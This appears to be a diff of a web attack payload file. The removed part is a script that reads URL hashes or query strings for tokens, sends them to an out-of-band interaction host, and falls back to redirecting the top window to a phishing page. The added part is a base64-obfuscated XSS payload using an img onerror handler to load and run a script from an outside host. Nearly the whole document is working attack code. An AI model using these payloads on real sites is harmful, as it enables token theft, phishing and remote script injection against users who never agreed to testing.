@@ -1,17 +1,1 @@
-<!DOCTYPE html>
-<html>
-<body>
-<script>
-// If sandbox allows top-navigation, steal URL fragments/params
-// that may contain tokens
-try {
-  // Some apps put tokens in the URL hash
-  var leak = window.top.location.hash || window.top.location.search;
-  new Image().src = "https://d78ec9b258c326399584gifzaryyyyyyb.oast.site/log?leak=" + encodeURIComponent(leak);
-} catch(e) {
-  // Cross-origin: can't read, but CAN write (navigate)
-  window.top.location = "https://YOUR-SERVER.com/phish";
-}
-</script>
-</body>
-</html>
+<html>"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL3I4YXdwZG1wOWsiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))></html>
